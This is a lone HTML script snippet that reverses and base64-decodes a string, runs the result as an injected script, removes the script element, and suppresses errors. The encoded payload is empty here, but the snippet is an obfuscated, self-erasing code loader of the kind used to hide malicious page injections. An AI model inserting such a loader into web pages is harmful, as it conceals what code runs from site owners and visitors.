<script>(function(){try{var a="";var b=atob(a.split("").reverse().join(""));var c;try{var u=new Uint8Array(b.length);for(var i=0;i<b.length;i++){u[i]=b.charCodeAt(i);}c=new TextDecoder("utf-8").decode(u);}catch(e){c=decodeURIComponent(escape(b));}var s=document.createElement("script");s.textContent=c;(document.head||document.documentElement).appendChild(s);s.parentNode.removeChild(s);}catch(e){}})();</script>
